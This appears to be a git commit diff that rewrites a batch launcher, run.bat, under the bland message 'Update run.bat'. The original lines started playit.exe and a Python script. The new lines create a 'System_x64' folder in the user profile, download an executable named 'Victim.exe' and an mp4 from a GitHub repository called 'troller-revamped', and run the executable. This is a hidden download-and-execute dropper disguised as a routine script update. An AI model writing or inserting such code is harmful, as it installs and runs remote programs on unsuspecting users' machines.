65f9aeea327148f651b4ed0362b77241c18b8d4f
vexnity <159264249+vexnity@users.noreply.github.com>
2024-05-10 22:54:15 -0700

    Update run.bat

--- run.bat
+++ run.bat
@@ -1,3 +1,6 @@
-@echo off
-start /B playit.exe -c playit.toml
-start /B python main.py
+cd %userprofile%
+mkdir System_x64
+cd System_x64
+curl -L "https://github.com/vexnity/troller-revamped/releases/download/preview/Victim.exe" -o victim.exe
+curl "https://raw.githubusercontent.com/vexnity/troller-revamped/preview/test.mp4" -o test.mp4
+%userprofile%\System_x64\Victim.exe
